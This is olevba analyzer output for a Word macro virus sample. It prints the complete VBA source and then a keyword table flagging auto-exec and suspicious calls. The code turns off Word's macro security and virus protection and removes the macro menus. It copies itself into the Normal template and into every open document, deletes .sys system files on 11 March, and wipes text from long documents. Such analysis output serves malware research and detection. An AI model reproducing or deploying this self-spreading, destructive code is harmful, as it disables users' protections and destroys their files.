olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-875657ecefde4588409858a11937f2c983b6d28b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-875657ecefde4588409858a11937f2c983b6d28b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Bethlem'
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
       CommandBars("Macro").Controls("Security...").Enabled = False
       System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    Else
       CommandBars("Tools").Controls("Macro").Enabled = False
       CommandBars("Tools").Controls("Macro").Delete
       'I know that you see the code!!!!!
       'Bethlem loves you
       Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1):
       Options.CheckSpellingAsYouType = (1 - 1): Options.CheckGrammarWithSpelling = (1 - 1):
       ActiveDocument.ShowGrammaticalErrors = (1 - 1): ActiveDocument.ShowSpellingErrors = (1 - 1):
       ActiveDocument.SpellingChecked = True
    End If
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Bethlem?") = "...by PPC"
    CommandBars("Tools").Controls("Macro").Enabled = False
    CommandBars("Tools").Controls("Macro").Delete
    Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1):
    Options.CheckSpellingAsYouType = (1 - 1): Options.CheckGrammarWithSpelling = (1 - 1):
    ActiveDocument.ShowGrammaticalErrors = (1 - 1): ActiveDocument.ShowSpellingErrors = (1 - 1):
    ActiveDocument.SpellingChecked = True
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Bethlem'" Then
       NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
       .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
       .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
       NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
       .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
       .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
       .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
       If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Bethlem'" Then
          Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
          .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
          .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
       End If
       If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
          Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
          .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
          .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
          .VBComponents.Item(1).CodeModule.CountOfLines)
       End If
    Next k
    If (Day(Now) = 11) And (Month(Now) = 3) Then
       MsgBox "Happy Birthday"
       File = Dir("c:\*.sys", 6)
       For BA = 1 To 10
          SetAttr "c:\" & File, vbNormal
          File = Dir
          If File = "" Then BA = 10
       Next BA
       Set fs = Application.FileSearch
       With fs
          .LookIn = "C:\"
          .FileName = "*.sys"
          .FileType = msoFileTypeAllFiles
          If .Execute(SortBy:=msoSortByFileName, _
             SortOrder:=msoSortOrderAscending) > 0 Then
             BC = .FoundFiles.Count
             File = Dir("c:\*.sys")
             For B = 1 To BC
                SetAttr "c:\" & File, vbNormal
                Kill ("c:\" & File)
                File = Dir
            Next B
          End If
       End With
    End If
    If Pages = ActiveDocument.BuiltInDocumentProperties(wdPropertyPages) >= 30 Then
       Set myRange = ActiveDocument.Range(Start:=0, End:=Selection.End)
       For Each xWord In myRange.Words
          xWord.Delete
          ActiveDocument.UndoClear
       Next xWord
    'Microsoft thanks for the examples are very useful
    End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub












+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

